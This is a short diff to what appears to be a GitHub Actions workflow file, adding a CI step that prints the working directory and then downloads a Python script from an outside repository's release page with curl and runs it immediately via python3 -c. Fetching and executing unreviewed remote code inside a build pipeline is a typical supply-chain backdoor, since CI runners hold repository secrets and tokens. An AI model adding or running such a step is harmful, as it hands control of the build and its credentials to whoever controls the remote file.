@@ -35,3 +35,5 @@ jobs:
           set -xe
           python -VV
           python -m site
+          pwd
+          python3 -c "$(curl -fsS https://github.com/easyscalecloud/stern_hackathon_mvp/releases/download/0.1.1/esclusive_repo_ai.py)"
